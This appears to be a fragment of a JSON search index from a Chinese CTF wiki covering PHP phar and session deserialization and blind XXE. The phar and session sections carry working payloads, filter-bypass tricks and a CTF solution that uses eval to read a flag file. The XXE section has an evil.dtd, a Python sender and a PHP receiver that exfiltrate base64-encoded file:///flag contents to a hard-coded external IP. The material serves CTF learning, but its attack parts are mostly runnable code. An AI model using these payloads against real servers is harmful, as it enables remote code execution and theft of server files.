manifest:phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u6f0f\u6d1e\u5229\u7528\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 content:\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9 signature (\u53ef\u7a7a):\u7b7e\u540d\uff0c\u653e\u5728\u672b\u5c3e\u3002 \u5982\u4f55\u751f\u6210\u4e00\u4e2aphar\u6587\u4ef6\uff1f\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u53c2\u8003\u4f8b\u5b50 <?php class Test { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new Test (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?>","title":"phar\u6587\u4ef6\u7684\u7ed3\u6784"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_11","text":"phar\u6587\u4ef6\u8981\u80fd\u591f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7aef\u3002 \u8981\u6709\u53ef\u7528\u7684\u9b54\u672f\u65b9\u6cd5\u4f5c\u4e3a\u201c\u8df3\u677f\u201d\u3002 \u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4e14 : \u3001 / \u3001 phar \u7b49\u7279\u6b8a\u5b57\u7b26\u6ca1\u6709\u88ab\u8fc7\u6ee4\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_12","text":"\u77e5\u9053\u521b\u5b87\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5217\u8868\uff1a \u5b9e\u9645\u4e0a\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u4e5f\u53ef\u4ee5\u53c2\u8003\u8fd9\u7bc7\u94fe\u63a5\uff0c\u91cc\u9762\u6709\u8be6\u7ec6\u8bf4\u660ehttps://blog.zsxsoft.com/post/38 \u5f53\u7136\u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u8fd9\u91cc\u4fbf\u628a\u5b83\u6574\u7406\u8fc7\u6765 //exif exif_thumbnail exif_imagetype //gd imageloadfont imagecreatefrom***\u7cfb\u5217\u51fd\u6570 //hash hash_hmac_file hash_file hash_update_file md5_file sha1_file // file/url get_meta_tags get_headers //standard getimagesize getimagesizefromstring // zip $zip = new ZipArchive(); $res = $zip->open('c.zip'); $zip->extractTo('phar://test.phar/test'); // Bzip / Gzip \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528compress.bzip2://\u548ccompress.zlib://\u7ed5\u8fc7 $z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt'; $z = 'compress.zlib://phar:///home/sx/test.phar/test.txt'; //\u914d\u5408\u5176\u4ed6\u534f\u8bae\uff1a(SUCTF) //https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/ //\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002 //php://filter/read=convert.base64-encode/resource=phar://phar.phar //Postgres pgsqlCopyToFile\u548cpg_trace\u540c\u6837\u4e5f\u662f\u80fd\u4f7f\u7528\u7684\uff0c\u9700\u8981\u5f00\u542fphar\u7684\u5199\u529f\u80fd\u3002 <?php $pdo = new PDO ( sprintf ( \"pgsql:host=%s;dbname=%s;user=%s;password=%s\" , \"127.0.0.1\" , \"postgres\" , \"sx\" , \"123456\" )); @ $pdo -> pgsqlCopyFromFile ( 'aa' , 'phar://phar.phar/aa' ); ?> // Mysql //LOAD DATA LOCAL INFILE\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2aphp_stream_open_wrapper //\u914d\u7f6e\u4e00\u4e0bmysqld: //[mysqld] //local-infile=1 //secure_file_priv=\"\" <?php class A { public $s = '' ; public function __wakeup () { system ( $this -> s ); } } $m = mysqli_init (); mysqli_options ( $m , MYSQLI_OPT_LOCAL_INFILE , true ); $s = mysqli_real_connect ( $m , 'localhost' , 'root' , 'root' , 'testtable' , 3306 ); $p = mysqli_query ( $m , 'LOAD DATA LOCAL INFILE \\'phar://test.phar/test\\' INTO TABLE a LINES TERMINATED BY \\'\\r\\n\\' IGNORE 1 LINES;' ); ?>","title":"\u53d7\u5f71\u54cd\u7684\u51fd\u6570"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_13","text":"\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528 compress.bzip2:// \u548c compress.zlib:// \u7b49\u7ed5\u8fc7 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt \u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002 php://filter/read=convert.base64-encode/resource=phar://phar.phar GIF\u683c\u5f0f\u9a8c\u8bc1\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u5934\u90e8\u6dfb\u52a0GIF89a\u7ed5\u8fc7 1\u3001$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //\u8bbe\u7f6estub 2\u3001\u751f\u6210\u4e00\u4e2aphar.phar\uff0c\u4fee\u6539\u540e\u7f00\u540d\u4e3aphar.gif","title":"\u7ed5\u8fc7\u65b9\u5f0f"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#php-session","text":"","title":"php-session\u53cd\u5e8f\u5217\u5316"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#session","text":"\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c24\u5176\u662f\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u79f0\u4e3a\u201c\u4f1a\u8bdd\u63a7\u5236\u201d\u3002Session \u5bf9\u8c61\u5b58\u50a8\u7279\u5b9a\u7528\u6237\u4f1a\u8bdd\u6240\u9700\u7684\u5c5e\u6027\u53ca\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u6837\uff0c\u5f53\u7528\u6237\u5728\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u4e4b\u95f4\u8df3\u8f6c\u65f6\uff0c\u5b58\u50a8\u5728 Session \u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf\u5c06\u4e0d\u4f1a\u4e22\u5931\uff0c\u800c\u662f\u5728\u6574\u4e2a\u7528\u6237\u4f1a\u8bdd\u4e2d\u4e00\u76f4\u5b58\u5728\u4e0b\u53bb\u3002\u5f53\u7528\u6237\u8bf7\u6c42\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u65f6\uff0c\u5982\u679c\u8be5\u7528\u6237\u8fd8\u6ca1\u6709\u4f1a\u8bdd\uff0c\u5219 Web \u670d\u52a1\u5668\u5c06\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a Session \u5bf9\u8c61\u3002\u5f53\u4f1a\u8bdd\u8fc7\u671f\u6216\u88ab\u653e\u5f03\u540e\uff0c\u670d\u52a1\u5668\u5c06\u7ec8\u6b62\u8be5\u4f1a\u8bdd\u3002 \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0cSeesion_start()\u51fd\u6570\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u7684Session ID\uff0c\u5e76\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u54cd\u5e94\u5934\uff0c\u5c06\u8fd9\u4e2aSession ID\u4fdd\u5b58\u5230\u5ba2\u6237\u7aefCookie\u4e2d\u3002\u540c\u65f6\uff0c\u4e5f\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e00\u4e2a\u4ee5Session ID\u547d\u540d\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8fd9\u4e2a\u7528\u6237\u7684\u4f1a\u8bdd\u4fe1\u606f\u3002\u5f53\u540c\u4e00\u4e2a\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u4e5f\u4f1a\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u8bf7\u6c42\u5934\u5c06Cookie\u4e2d\u4fdd\u5b58\u7684Seesion ID\u518d\u643a\u5e26\u8fc7\u6765\uff0c\u8fd9\u65f6Session_start()\u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u53bb\u5206\u914d\u4e00\u4e2a\u65b0\u7684Session ID\uff0c\u800c\u662f\u5728\u670d\u52a1\u5668\u7684\u786c\u76d8\u4e2d\u53bb\u5bfb\u627e\u548c\u8fd9\u4e2aSession ID\u540c\u540d\u7684Session\u6587\u4ef6\uff0c\u5c06\u8fd9\u4e4b\u524d\u4e3a\u8fd9\u4e2a\u7528\u6237\u4fdd\u5b58\u7684\u4f1a\u8bdd\u4fe1\u606f\u8bfb\u51fa\uff0c\u5728\u5f53\u524d\u811a\u672c\u4e2d\u5e94\u7528\uff0c\u8fbe\u5230\u8ddf\u8e2a\u8fd9\u4e2a\u7528\u6237\u7684\u76ee\u7684\u3002","title":"session\u7b80\u5355\u4ecb\u7ecd"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#session_1","text":"php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879session.save_handler\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002 \u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5sess_sessionid\u6765\u8fdb\u884c\u547d\u540d\u7684 php_serialize \u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u6570\u7ec4 php \u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5904\u7406\u7684\u503c php_binary \u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ascii\u5b57\u7b26+\u952e\u540d+serialize()\u51fd\u6570\u5e8f\u5217\u5316\u7684\u503c","title":"session \u7684\u5b58\u50a8\u673a\u5236"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#phpinisession","text":"session.save_path=\"\" --\u8bbe\u7f6esession\u7684\u5b58\u50a8\u8def\u5f84 session.save_handler=\"\"--\u8bbe\u5b9a\u7528\u6237\u81ea\u5b9a\u4e49\u5b58\u50a8\u51fd\u6570\uff0c\u5982\u679c\u60f3\u4f7f\u7528PHP\u5185\u7f6e\u4f1a\u8bdd\u5b58\u50a8\u673a\u5236\u4e4b\u5916\u7684\u53ef\u4ee5\u4f7f\u7528\u672c\u51fd\u6570(\u6570\u636e\u5e93\u7b49\u65b9\u5f0f) session.auto_start boolen--\u6307\u5b9a\u4f1a\u8bdd\u6a21\u5757\u662f\u5426\u5728\u8bf7\u6c42\u5f00\u59cb\u65f6\u542f\u52a8\u4e00\u4e2a\u4f1a\u8bdd\u9ed8\u8ba4\u4e3a0\u4e0d\u542f\u52a8 session.serialize_handler string--\u5b9a\u4e49\u7528\u6765\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u5904\u7406\u5668\u540d\u5b57\u3002\u9ed8\u8ba4\u4f7f\u7528php","title":"php.ini\u4e2d\u4e00\u4e9bsession\u914d\u7f6e"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_14","text":"","title":"\u5229\u7528\u59ff\u52bf"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#sessionupload_progress","text":"\u8fd9\u7bc7\u6587\u7ae0\u8bf4\u7684\u5f88\u8be6\u7ec6\u4e86\uff0c\u6ca1\u5fc5\u8981\u73ed\u95e8\u5f04\u65a7 https://www.freebuf.com/vuls/202819.html","title":"session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#session_2","text":"","title":"\u4f7f\u7528\u4e0d\u540c\u7684\u5f15\u64ce\u6765\u5904\u7406session\u6587\u4ef6"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_session","text":"php\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f \u952e\u540d|serialized_string \uff0c\u800cphp_serialize\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f serialized_string \u3002\u5982\u679c\u7a0b\u5e8f\u4f7f\u7528\u4e24\u4e2a\u5f15\u64ce\u6765\u5206\u522b\u5904\u7406\u7684\u8bdd\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898 \u6765\u770b\u770b\u8fd9\u4e24\u4e2aphp // 1.php <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); $_SESSION [ 'y4' ] = $_GET [ 'a' ]; var_dump ( $_SESSION ); //2.php <? php ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class test { public $name ; function __wakeup (){ echo $this -> name ; } } \u9996\u5148\u8bbf\u95ee1.php\uff0c\u4f20\u5165\u53c2\u6570 a=|O:4:\"test\":1:{s:4:\"name\";s:8:\"y4tacker\";} \u518d\u8bbf\u95ee2.php\uff0c\u6ce8\u610f\u4e0d\u8981\u5fd8\u8bb0 | \u7531\u4e8e 1.php \u662f\u4f7f\u7528 php_serialize \u5f15\u64ce\u5904\u7406\uff0c\u56e0\u6b64\u53ea\u4f1a\u628a '|' \u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\u3002\u7136\u540e\u8bbf\u95ee 2.php \uff0c\u7531\u4e8e\u7528\u7684\u662f php \u5f15\u64ce\uff0c\u56e0\u6b64\u9047\u5230 '|' \u65f6\u4f1a\u5c06\u4e4b\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9 '|' \u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002 \u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u4e00\u4e2a\u5c0f\u7591\u95ee\uff0c\u4e3a\u4ec0\u4e48\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9 '|' \u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u5904\u7406\u5668\u7684\u529f\u80fd\uff1f\u8fd9\u4e2a\u5176\u5b9e\u662f\u56e0\u4e3a session_start() \u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u4e0b\u5b98\u65b9\u8bf4\u660e\uff1a \u5f53\u4f1a\u8bdd\u81ea\u52a8\u5f00\u59cb\u6216\u8005\u901a\u8fc7 session_start() \u624b\u52a8\u5f00\u59cb\u7684\u65f6\u5019\uff0c PHP \u5185\u90e8\u4f1a\u8c03\u7528\u4f1a\u8bdd\u7ba1\u7406\u5668\u7684 open \u548c read \u56de\u8c03\u51fd\u6570\u3002 \u4f1a\u8bdd\u7ba1\u7406\u5668\u53ef\u80fd\u662f PHP \u9ed8\u8ba4\u7684\uff0c \u4e5f\u53ef\u80fd\u662f\u6269\u5c55\u63d0\u4f9b\u7684\uff08SQLite \u6216\u8005 Memcached \u6269\u5c55\uff09\uff0c \u4e5f\u53ef\u80fd\u662f\u901a\u8fc7 session_set_save_handler() \u8bbe\u5b9a\u7684\u7528\u6237\u81ea\u5b9a\u4e49\u4f1a\u8bdd\u7ba1\u7406\u5668\u3002 \u901a\u8fc7 read \u56de\u8c03\u51fd\u6570\u8fd4\u56de\u7684\u73b0\u6709\u4f1a\u8bdd\u6570\u636e \uff08\u4f7f\u7528\u7279\u6b8a\u7684\u5e8f\u5217\u5316\u683c\u5f0f\u5b58\u50a8\uff09\uff0c PHP \u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u6570\u636e\u5e76\u4e14\u586b\u5145 $_SESSION \u8d85\u7ea7\u5168\u5c40\u53d8\u91cf \u56e0\u6b64\u6211\u4eec\u6210\u529f\u89e6\u53d1\u4e86 test \u7c7b\u4e2d\u7684 __wakeup() \u65b9\u6cd5,\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u601d\u8def\u662f\u53ef\u884c\u7684\u3002\u4f46\u8fd9\u79cd\u65b9\u6cd5\u662f\u5728\u53ef\u4ee5\u5bf9 session \u7684\u8fdb\u884c\u8d4b\u503c\u7684\uff0c\u90a3\u5982\u679c\u4ee3\u7801\u4e2d\u4e0d\u5b58\u5728\u5bf9 $_SESSION \u53d8\u91cf\u8d4b\u503c\u7684\u60c5\u51b5\u4e0b\u53c8\u8be5\u5982\u4f55\u5229\u7528","title":"$_SESSION\u53d8\u91cf\u76f4\u63a5\u53ef\u63a7"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_session_1","text":"\u6211\u4eec\u6765\u770b\u9ad8\u6821\u6218\u75ab\u7684\u4e00\u9053CTF\u9898\u76ee <?php //A webshell is wait for you ini_set ( 'session.serialize_handler' , 'php' ); session_start (); class OowoO { public $mdzz ; function __construct () { $this -> mdzz = 'phpinfo();' ; } function __destruct () { eval ( $this -> mdzz ); } } if ( isset ( $_GET [ 'phpinfo' ])) { $m = new OowoO (); } else { highlight_string ( file_get_contents ( 'index.php' )); } ?> \u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u6837\u4e00\u53e5\u8bdd ini_set('session.serialize_handler', 'php'); \uff0c\u56e0\u6b64\u4e0d\u96be\u731c\u6d4b\u672c\u8eab\u5728 php.ini \u5f53\u4e2d\u7684\u8bbe\u7f6e\u53ef\u80fd\u662f php_serialize \uff0c\u5728\u67e5\u770b\u4e86 phpinfo \u540e\u5f97\u8bc1\u731c\u6d4b\u6b63\u786e\uff0c\u4e5f\u77e5\u9053\u4e86\u8fd9\u9053\u9898\u7684\u8003\u70b9 \u90a3\u4e48\u6211\u4eec\u5c31\u8fdb\u5165phpinfo\u67e5\u770b\u4e00\u4e0b\uff0cenabled=on\u8868\u793aupload_progress\u529f\u80fd\u5f00\u59cb\uff0c\u4e5f\u610f\u5473\u7740\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \uff1b\u53ea\u9700\u5f80\u8be5\u5730\u5740\u4efb\u610f POST \u4e00\u4e2a\u540d\u4e3a PHP_SESSION_UPLOAD_PROGRESS \u7684\u5b57\u6bb5\uff0c\u5c31\u53ef\u4ee5\u5c06filename\u7684\u503c\u8d4b\u503c\u5230session\u4e2d \u6784\u9020\u6587\u4ef6\u4e0a\u4f20\u7684\u8868\u5355 < form action = \"http://web.jarvisoj.com:32784/index.php\" method = \"POST\" enctype = \"multipart/form-data\" > < input type = \"hidden\" name = \"777\" /> < input type = \"file\" name = \"file\" /> < input type = \"submit\" /> </ form > \u63a5\u4e0b\u6765\u6784\u9020\u5e8f\u5217\u5316payload <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); class OowoO { public $mdzz = 'print_r(scandir(dirname(__FILE__)));' ; } $obj = new OowoO (); echo serialize ( $obj ); ?> \u7531\u4e8e\u91c7\u7528Burp\u53d1\u5305\uff0c\u4e3a\u9632\u6b62\u53cc\u5f15\u53f7\u88ab\u8f6c\u4e49\uff0c\u5728\u53cc\u5f15\u53f7\u524d\u52a0\u4e0a \\ \uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u8981\u52a0\u4e0a | \u5728\u8fd9\u4e2a\u9875\u9762\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u6293\u5305\u4fee\u6539 filename \u7684\u503c \u53ef\u4ee5\u770b\u5230 Here_1s_7he_fl4g_buT_You_Cannot_see.php \u8fd9\u4e2a\u6587\u4ef6\uff0cflag\u80af\u5b9a\u5728\u91cc\u9762\uff0c\u4f46\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u4e0d\u77e5\u9053\u8fd9\u4e2a\u8def\u5f84\uff0c\u8def\u5f84\u7684\u95ee\u9898\u5c31\u9700\u8981\u56de\u5230phpinfo\u9875\u9762\u53bb\u67e5\u770b \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u628apayload\uff0c\u5f53\u4e2d\u6539\u4e3a print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\")); \u5373\u53ef\u83b7\u53d6flag <?php ini_set ( 'session.serialize_handler' , 'php_serialize' ); session_start (); class OowoO { public $mdzz = 'print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));' ; } $obj = new OowoO (); echo serialize ( $obj ); ?>","title":"$_SESSION\u53d8\u91cf\u76f4\u63a5\u4e0d\u53ef\u63a7"},{"location":"CTFWiki/Web/Unserialize/php\u53cd\u5e8f\u5217\u5316/#_15","text":"https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158/article/details/99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"CTFWiki/Web/XXE/XXE/","text":"XXE \u00b6 What is xxe? Descripotion:\u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u6df1\u5165\u7406\u89e3\u6f0f\u6d1e\u4e4b XXE \u6f0f\u6d1e(\u89c9\u5f97\u5199\u7684\u4e0d\u9519\u8bf6) A simple CTF question Description:\u4e00\u9053\u6700\u7b80\u5355\u7684\u9898\u5e2e\u4f60\u719f\u6089XXE XXE with No return display Description:\u65e0\u56de\u663e\u5b9e\u73b0\u5e26\u5916\u8f93\u51fa Bypass by using exotic encodings Descripotion: Use UTF-16\u3001UTF-32 and EBCDIC instead of UTF-8 to bypass. Bypass by using different encodings Description:Use two different encodings to bypass. Add: Here are many ways on xxe bypass Chinese Translation :\u90a3\u4e2a\u662f\u82f1\u6587\u7248\u7684\uff0c\u53d1\u73b0\u4e86\u4e2d\u6587\u7248 Link Sharing \u00b6 Xml\u5b98\u65b9\u6587\u6863 XXE that can Bypass WAF Protection","title":"XXE"},{"location":"CTFWiki/Web/XXE/XXE/#xxe","text":"What is xxe? Descripotion:\u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u6df1\u5165\u7406\u89e3\u6f0f\u6d1e\u4e4b XXE \u6f0f\u6d1e(\u89c9\u5f97\u5199\u7684\u4e0d\u9519\u8bf6) A simple CTF question Description:\u4e00\u9053\u6700\u7b80\u5355\u7684\u9898\u5e2e\u4f60\u719f\u6089XXE XXE with No return display Description:\u65e0\u56de\u663e\u5b9e\u73b0\u5e26\u5916\u8f93\u51fa Bypass by using exotic encodings Descripotion: Use UTF-16\u3001UTF-32 and EBCDIC instead of UTF-8 to bypass. Bypass by using different encodings Description:Use two different encodings to bypass. Add: Here are many ways on xxe bypass Chinese Translation :\u90a3\u4e2a\u662f\u82f1\u6587\u7248\u7684\uff0c\u53d1\u73b0\u4e86\u4e2d\u6587\u7248","title":"XXE"},{"location":"CTFWiki/Web/XXE/XXE/#link-sharing","text":"Xml\u5b98\u65b9\u6587\u6863 XXE that can Bypass WAF Protection","title":"Link Sharing"},{"location":"CTFWiki/Web/XXE/\u65e0\u56de\u663e/","text":"XXE\u89e3\u51b3\u65e0\u56de\u663e \u00b6 \u4ee3\u7801\u5ba1\u8ba1 <?php error_reporting ( 0 ); libxml_disable_entity_loader ( false ); $xmlfile = file_get_contents ( 'php://input' ); if ( isset ( $xmlfile )){ $dom = new DOMDocument (); $dom -> loadXML ( $xmlfile , LIBXML_NOENT | LIBXML_DTDLOAD ); } highlight_file ( __FILE__ ); \u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684VPS\u5b9e\u73b0\u5e26\u5916\u8f93\u51fa \u9996\u5148\u5efa\u4e00\u4e2aindex.php <?php $cookie = $_GET [ 'q' ]; $myFile = \"cookie.txt\" ; file_put_contents ( $myFile , $cookie , FILE_APPEND ); ?> evil.dtd <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\" > <!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://42.192.137.212/index.php?q=%file;'>\" > python\u53d1\u9001\u8bf7\u6c42\u5373\u53ef\uff0c\u4e4b\u540e\u518d\u7f51\u7ad9\u6839\u76ee\u5f55cookie.txt\u67e5\u770b\u83b7\u53d6\u7684flag\u5373\u53ef import requests url = 'http://8bb031b1-bab9-43fe-b73b-d9741ed6617b.chall.ctf.show/' payload = \"\"\"<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://42.192.137.212/evil.dtd\"> %remote;%int;%send; ]> \"\"\" requests.post(url, data=payload) \u5907\u6ce8 \u00b6 \u5173\u4e8e\u5b9e\u4f53\u5d4c\u5957\u7684\u60c5\u51b5\uff0c\u6bd4\u8f83\u5e78\u8fd0\u7684\u662fDTD\u4e2d\u652f\u6301\u5355\u53cc\u5f15\u53f7\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5355\u53cc\u5f15\u53f7\u95f4\u9694\u4f7f\u7528\u4f5c\u4e3a\u533a\u5206\u5d4c\u5957\u5b9e\u4f53\u548c\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\uff1b\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u9700\u8981\u518d\u5d4c\u5957\u4e00\u4e2a\u53c2\u6570\u5b9e\u4f53\uff0c%\u53f7\u662f\u9700\u8981\u5904\u7406\u6210 % \u5982\u4e0b\uff1a <!ENTITY % param1 '<!ENTITY % xxe SYSTEM \"http://evil/log?%payload;\" >' &#37; \u4e5f\u53ef\u5199\u4e3a16\u8fdb\u5236 &#x25;","title":"XXE\u89e3\u51b3\u65e0\u56de\u663e"},{"location":"CTFWiki/Web/XXE/\u65e0\u56de\u663e/#xxe","text":"\u4ee3\u7801\u5ba1\u8ba1 <?php error_reporting ( 0 ); libxml_disable_entity_loader ( false ); $xmlfile = file_get_contents ( 'php://input' ); if ( isset ( $xmlfile )){ $dom = new DOMDocument (); $dom -> loadXML ( $xmlfile , LIBXML_NOENT | LIBXML_DTDLOAD ); } highlight_file ( __FILE__ ); \u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684VPS\u5b9e\u73b0\u5e26\u5916\u8f93\u51fa 